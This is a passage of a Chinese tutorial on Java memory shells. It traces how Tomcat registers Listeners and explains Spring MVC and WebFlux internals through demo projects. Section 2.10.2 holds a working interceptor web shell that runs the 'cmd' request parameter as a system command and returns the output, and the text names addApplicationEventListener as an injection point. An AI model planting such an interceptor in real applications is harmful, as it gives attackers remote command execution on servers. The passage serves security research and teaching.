<p>我们继续用我们之前在<code>2.2</code>中搭建的环境，替换掉之前的<code>TestFilter.java</code>，重新写一个<code>TestListener.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebListener</span><span class="o">;</span>

<span class="nd">@WebListener</span><span class="o">(</span><span class="s">"/test"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestListener</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] destroy TestListener"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] initial TestListener"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>运行结果：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001947-356d9eee-c830-1.jpeg"/></p>
<h2 data-content="1" id="be8ee5a7c1928ee8192d758950b952ae">2.9 从代码层面分析Listener运行的整体流程</h2>
<p>我们在如图所示的两个地方下断点调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001948-3624d32a-c830-1.jpeg"/></p>
<p>往下翻可以看到<code>org.apache.catalina.core.StandardContext#listenerStart</code>方法的调用：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001950-3703283c-c830-1.jpeg"/></p>
<p>代码写的通俗易懂，主要有两个事情要干，一是通过<code>findApplicationListeners</code>找到这些<code>Listerner</code>的名字；二是实例化这些<code>listener</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001951-38011172-c830-1.jpeg"/></p>
<p>接着就是分类摆放，我们需要的<code>ServletRequestListener</code>被放在了<code>eventListeners</code>里面：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001953-38f1bfc8-c830-1.jpeg"/></p>
<p>分类摆放完了之后，干这样一件事情：</p>
<div class="highlight"><pre><span></span><span class="n">eventListeners</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">getApplicationEventListeners</span><span class="o">()));</span>
</pre></div>
<p><code>Arrays.asList(...)</code> 好理解，意思就是将数组转换为列表；<code>eventListeners.addAll(...)</code>也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 <code>eventListeners</code> 中。关于括号里边的<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>这个方法，我们点进去看，代码如下：</p>
<div class="highlight"><pre><span></span><span class="nd">@Override</span>
<span class="kd">public</span> <span class="n">Object</span><span class="o">[]</span> <span class="nf">getApplicationEventListeners</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">applicationEventListenersList</span><span class="o">.</span><span class="na">toArray</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>也很简单明了，就是把<code>applicationEventListenersList</code>转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。</p>
<p>那这总结起来就一句话，就是<code>Listener</code>有两个来源，一是根据<code>web.xml</code>文件或者<code>@WebListener</code>注解实例化得到的<code>Listener</code>；二是<code>applicationEventListenersList</code>中的<code>Listener</code>。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的<code>addFilterConfig</code>这种函数呢？当然是有的，<code>ctrl+左键</code>往上找：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001955-39e512fe-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001956-3b0bf616-c830-1.jpeg"/></p>
<p>方法名字叫做<code>addApplicationEventListener</code>，在<code>StandardContext.java</code>里面，代码如下，完美符合我们的需求，真是太哇塞了：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">addApplicationEventListener</span><span class="o">(</span><span class="n">Object</span> <span class="n">listener</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">applicationEventListenersList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">listener</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="dd72920e5d69114451873f658ad8a3c6">2.10 简单的spring项目搭建</h2>
<p>新建个项目，设置<code>Server URL</code>为<code>https://start.aliyun.com/</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001957-3ba05ef0-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001959-3c61ac4a-c830-1.jpeg"/></p>
<p>等待依赖解析完成：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002001-3d92e00c-c830-1.jpeg"/></p>
<p>这里给我们准备了一个示例，我们可以直接跑起来：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002005-4055ddbc-c830-1.jpeg"/></p>
<h3 data-content="1" id="c3040fe9a2695103a284dd15e62a3017">2.10.1 编写一个简单的Spring Controller</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springcontrollermemoryshellexample.demos.web</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestController</span> <span class="o">{</span>
    <span class="nd">@ResponseBody</span>
    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">test</span><span class="o">(){</span>
        <span class="k">return</span> <span class="s">"hello world"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>非常地简单：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002009-427044b6-c830-1.jpeg"/></p>
<h3 data-content="1" id="a0e909a3210d80af88257f1b35436c94">2.10.2 编写一个简单的Spring Interceptor</h3>
<p><code>TestInterceptor.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springcontrollermemoryshellexample.demos.web</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.HandlerInterceptorAdapter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestInterceptor</span> <span class="kd">extends</span> <span class="n">HandlerInterceptorAdapter</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
        <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
                <span class="n">ProcessBuilder</span> <span class="n">processBuilder</span><span class="o">;</span>
                <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">)){</span>
                    <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">cmd</span><span class="o">);</span>
                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
                    <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">"/bin/sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">cmd</span><span class="o">);</span>
                <span class="o">}</span>
                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">inputScanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">processBuilder</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="n">output</span> <span class="o">=</span> <span class="n">inputScanner</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">inputScanner</span><span class="o">.</span><span class="na">next</span><span class="o">():</span> <span class="n">output</span><span class="o">;</span>
                <span class="n">inputScanner</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">ignored</span><span class="o">){}</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>WebConfig.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springcontrollermemoryshellexample.demos.web</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.Configuration</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.config.annotation.InterceptorRegistry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.config.annotation.WebMvcConfigurer</span><span class="o">;</span>

<span class="nd">@Configuration</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">WebConfig</span> <span class="kd">implements</span> <span class="n">WebMvcConfigurer</span> <span class="o">{</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">addInterceptors</span><span class="o">(</span><span class="n">InterceptorRegistry</span> <span class="n">registry</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">addInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">TestInterceptor</span><span class="o">()).</span><span class="na">addPathPatterns</span><span class="o">(</span><span class="s">"/**"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>Controller</code>就是之前写的<code>TestController.java</code>，运行后访问<code>http://127.0.0.1:8080/?cmd=whoami</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002010-434f1cc2-c830-1.jpeg"/></p>
<h3 data-content="1" id="0c0ad25ebfda1d4c7c8dd14ef8919eba">2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）</h3>
<p>我们先聊聊怎么自己写一个<code>Spring WebFlux</code>框架的<code>demo</code>。</p>
<p>这里我们新建一个<code>SpringBoot</code>项目，取名<code>WebFluxMemoryShellDemo</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002011-43c5f248-c830-1.jpeg"/></p>
<p>这里选择<code>Spring Reactive Web</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002012-44232f08-c830-1.jpeg"/></p>
<p>接着新建两个文件，这里为了方便，我把这两个文件放到<code>hello</code>文件夹下。</p>
<p><code>GreetingHandler.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.webfluxmemoryshelldemo.hello</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.http.MediaType</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Component</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.reactive.function.BodyInserters</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.reactive.function.server.ServerRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.reactive.function.server.ServerResponse</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">reactor.core.publisher.Mono</span><span class="o">;</span>

<span class="nd">@Component</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">GreetingHandler</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="n">Mono</span><span class="o">&lt;</span><span class="n">ServerResponse</span><span class="o">&gt;</span> <span class="nf">hello</span><span class="o">(</span><span class="n">ServerRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">ServerResponse</span><span class="o">.</span><span class="na">ok</span><span class="o">().</span><span class="na">contentType</span><span class="o">(</span><span class="n">MediaType</span><span class="o">.</span><span class="na">TEXT_PLAIN</span><span class="o">).</span><span class="na">body</span><span class="o">(</span><span class="n">BodyInserters</span><span class="o">.</span><span class="na">fromValue</span><span class="o">(</span><span class="s">"Hello, Spring!"</span><span class="o">));</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>GreetingRouter.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.webfluxmemoryshelldemo.hello</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.Bean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.Configuration</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.http.MediaType</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.reactive.function.server.*</span><span class="o">;</span>

<span class="nd">@Configuration</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">GreetingRouter</span> <span class="o">{</span>
    <span class="nd">@Bean</span>
    <span class="kd">public</span> <span class="n">RouterFunction</span><span class="o">&lt;</span><span class="n">ServerResponse</span><span class="o">&gt;</span> <span class="nf">route</span><span class="o">(</span><span class="n">GreetingHandler</span> <span class="n">greetingHandler</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">RouterFunctions</span><span class="o">.</span><span class="na">route</span><span class="o">(</span><span class="n">RequestPredicates</span><span class="o">.</span><span class="na">GET</span><span class="o">(</span><span class="s">"/hello"</span><span class="o">).</span><span class="na">and</span><span class="o">(</span><span class="n">RequestPredicates</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">MediaType</span><span class="o">.</span><span class="na">TEXT_PLAIN</span><span class="o">)),</span> <span class="n">greetingHandler</span><span class="o">::</span><span class="n">hello</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>我们可以新建<code>main/resources</code>文件夹，然后新建<code>application.properties</code>，通过<code>server.port</code>来控制<code>netty</code>服务的端口：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002013-44a979be-c830-1.jpeg"/></p>
<p>接着我们运行：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002014-4562289c-c830-1.jpeg"/></p>
<p>这里我从<code>github</code>上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是<code>Netty</code>+<code>SpringWebFlux</code>：</p>
<blockquote>
<p><a href="https://github.com/Java-Techie-jt/springboot-webflux-demo" target="_blank">https://github.com/Java-Techie-jt/springboot-webflux-demo</a></p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002016-46b27580-c830-1.jpeg"/></p>
<p>随便访问个路由。例如<code>http://127.0.0.1:9191/customers/stream</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002018-47a2a99c-c830-1.jpeg"/></p>
<h2 data-content="1" id="396242a0bcaf7513f10021fd1a0cfaee">2.11 Spring MVC介绍</h2>
<p>如果想要深入理解<code>Spring MVC</code>框架型内存马，那么对<code>Spring MVC</code>的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。</p>
<p>首先引用《<code>Spring in Action</code>》上的一张图（这里我重制了一下）来了解<code>Spring MVC</code>的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002019-487095b4-c830-1.jpeg"/></p>
<p>可以看到，这里有一堆名词，我们一一来看：</p>
<ul>
<li>
<code>DispatcherServlet</code>是前端控制器，它负责接收<code>Request</code>并将<code>Request</code>转发给对应的处理组件；</li>
<li>
<code>HandlerMapping</code>负责完成<code>url</code>到<code>Controller</code>映射，可以通过它来找到对应的处理<code>Request</code>的<code>Controller</code>；</li>
<li>
<code>Controller</code>处理<code>Request</code>，并返回<code>ModelAndVIew</code>对象，<code>ModelAndView</code>是封装结果视图的组件；</li>
<li>④~⑦表示视图解析器解析<code>ModelAndView</code>对象并返回对应的视图给客户端。</li>
</ul>
<p>还有一个概念需要了解，就是<code>IOC</code>容器，因为这个名词会在本文后面的内容中提及。</p>
<p><code>IOC</code>（控制反转）容器是<code>Spring</code>框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。<code>IOC</code>容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。<code>Spring</code>框架提供了多种实现<code>IOC</code>容器的方式，下面讲两种常见的：</p>
<ul>
<li>
<p><code>BeanFactory</code>：<code>Spring</code>的最基本的<code>IOC</code>容器，提供了基本的<code>IOC</code>功能，只有在第一次请求时才创建对象。</p>
</li>
<li>
<p><code>ApplicationContext</code>：这是<code>BeanFactory</code>的扩展，提供了更多的企业级功能。<code>ApplicationContext</code>在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。</p>
</li>
</ul>
<h3 data-content="1" id="c90df54a58801262a5fa8b52cee019e9">2.11.1 Spring MVC九大组件</h3>
<p>这九大组件需要有个印象：</p>
<p><code>DispatcherServlet</code>（派发<code>Servlet</code>）：负责将请求分发给其他组件，是整个<code>Spring MVC</code>流程的核心；<br/>
<code>HandlerMapping</code>（处理器映射）：用于确定请求的处理器（<code>Controller</code>）；<br/>
<code>HandlerAdapter</code>（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；<br/>
<code>HandlerInterceptor</code>（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；<br/>
<code>Controller</code>（控制器）：处理用户请求并返回适当的模型和视图；<br/>
<code>ModelAndView</code>（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；<br/>
<code>ViewResolver</code>（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；<br/>
<code>LocaleResolver</code>（区域解析器）：处理区域信息，用于国际化；<br/>
<code>ThemeResolver</code>（主题解析器）：用于解析<code>Web</code>应用的主题，实现界面主题的切换。</p>
<h3 data-content="1" id="bdcb9441999db13637693cd45838c9ed">2.11.2 简单的源码分析</h3>
<h4 data-content="1" id="878ea1d49591fb1b88596038fdc517d8">2.11.2.1 九大组件的初始化</h4>
<p>首先是找到<code>org.springframework.web.servlet.DispatcherServlet</code>，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002022-4a223c64-c830-1.jpeg"/></p>
<p>但是没有<code>init()</code>函数，我们翻看其父类<code>FrameworkServlet</code>的父类<code>org.springframework.web.servlet.HttpServletBean</code>的时候发现有<code>init</code>函数：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002024-4ba5420c-c830-1.jpeg"/></p>
<p>代码如下：</p>
<div class="highlight"><pre><span></span><span class="nd">@Override</span>
<span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>

    <span class="c1">// Set bean properties from init parameters.</span>
    <span class="n">PropertyValues</span> <span class="n">pvs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletConfigPropertyValues</span><span class="o">(</span><span class="n">getServletConfig</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">requiredProperties</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">pvs</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">BeanWrapper</span> <span class="n">bw</span> <span class="o">=</span> <span class="n">PropertyAccessorFactory</span><span class="o">.</span><span class="na">forBeanPropertyAccess</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
            <span class="n">ResourceLoader</span> <span class="n">resourceLoader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletContextResourceLoader</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
            <span class="n">bw</span><span class="o">.</span><span class="na">registerCustomEditor</span><span class="o">(</span><span class="n">Resource</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="k">new</span> <span class="n">ResourceEditor</span><span class="o">(</span><span class="n">resourceLoader</span><span class="o">,</span> <span class="n">getEnvironment</span><span class="o">()));</span>
            <span class="n">initBeanWrapper</span><span class="o">(</span><span class="n">bw</span><span class="o">);</span>
            <span class="n">bw</span><span class="o">.</span><span class="na">setPropertyValues</span><span class="o">(</span><span class="n">pvs</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">BeansException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">logger</span><span class="o">.</span><span class="na">isErrorEnabled</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Failed to set bean properties on servlet '"</span> <span class="o">+</span> <span class="n">getServletName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"'"</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">throw</span> <span class="n">ex</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="c1">// Let subclasses do whatever initialization they like.</span>
    <span class="n">initServletBean</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>先是从<code>Servlet</code>的配置中获取初始化参数并创建一个<code>PropertyValues</code>对象，然后设置<code>Bean</code>属性；关键在最后一步，调用了<code>initServletBean</code>这个方法。</p>
<p>我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候<code>override</code>了该方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002027-4d4b62a8-c830-1.jpeg"/></p>
<p>果不其然，我们在<code>org.springframework.web.servlet.FrameworkServlet</code>中成功找到了该方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002030-4f3da3dc-c830-1.jpeg"/></p>
<p>代码如下：</p>
<div class="highlight"><pre><span></span><span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">initServletBean</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
    <span class="n">getServletContext</span><span class="o">().</span><span class="na">log</span><span class="o">(</span><span class="s">"Initializing Spring "</span> <span class="o">+</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" '"</span> <span class="o">+</span> <span class="n">getServletName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"'"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">logger</span><span class="o">.</span><span class="na">isInfoEnabled</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"Initializing Servlet '"</span> <span class="o">+</span> <span class="n">getServletName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"'"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kt">long</span> <span class="n">startTime</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webApplicationContext</span> <span class="o">=</span> <span class="n">initWebApplicationContext</span><span class="o">();</span>
        <span class="n">initFrameworkServlet</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="o">|</span> <span class="n">RuntimeException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Context initialization failed"</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
        <span class="k">throw</span> <span class="n">ex</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">logger</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">enableLoggingRequestDetails</span> <span class="o">?</span>
                <span class="s">"shown which may lead to unsafe logging of potentially sensitive data"</span> <span class="o">:</span>
                <span class="s">"masked to prevent unsafe logging of potentially sensitive data"</span><span class="o">;</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">"enableLoggingRequestDetails='"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">enableLoggingRequestDetails</span> <span class="o">+</span>
                <span class="s">"': request parameters and headers will be "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">logger</span><span class="o">.</span><span class="na">isInfoEnabled</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"Completed initialization in "</span> <span class="o">+</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">startTime</span><span class="o">)</span> <span class="o">+</span> <span class="s">" ms"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这段代码的<code>log</code>和计时部分就不说了，我们捡关键的说。它先是调用<code>initWebApplicationContext</code>方法，初始化<code>IOC</code>容器，在初始化的过程中，会调用到这个<code>onRefresh</code>方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002035-51b92406-c830-1.jpeg"/></p>
<p>跟入该方法，可以看到其中默认为空：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002038-53ce633c-c830-1.jpeg"/></p>
<p>说明在它的子类中应该会有<code>override</code>，果然我们定位到了<code>org.springframework.web.servlet.DispatcherServlet#</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002040-54cd1c6a-c830-1.jpeg"/></p>
<p>这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了<code>Spring MVC</code>的九大组件的初始化。</p>
<h4 data-content="1" id="652aa3fd20f2567c5153d93b2795ab04">2.11.2.2 url和Controller的关系的建立</h4>
<p>你可能会有这样的一个疑惑：我们是用<code>@RequestMapping("/")</code>注解在方法上的，那<code>Spring MVC</code>是怎么根据这个注解就把对应的请求和这个方法关联起来的？</p>
<p>从上面的九大组件的初始化中可以看到，有个方法就叫做<code>initHandlerMappings</code>，我们点进去详细看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002043-56e88a84-c830-1.jpeg"/></p>
